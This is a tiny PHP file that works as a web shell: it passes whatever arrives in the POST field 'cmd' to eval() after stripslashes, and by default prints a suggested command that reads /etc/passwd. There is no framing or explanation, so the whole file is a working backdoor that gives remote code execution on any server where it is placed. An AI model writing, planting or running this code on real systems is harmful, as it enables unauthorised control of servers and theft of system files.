<?php
function magicboom($text){
	return stripslashes($text);
}

if(isset($_POST['submitcmd'])) {
	echo eval(magicboom($_POST['cmd']));
}
else echo "echo file_get_contents('/etc/passwd');";
?>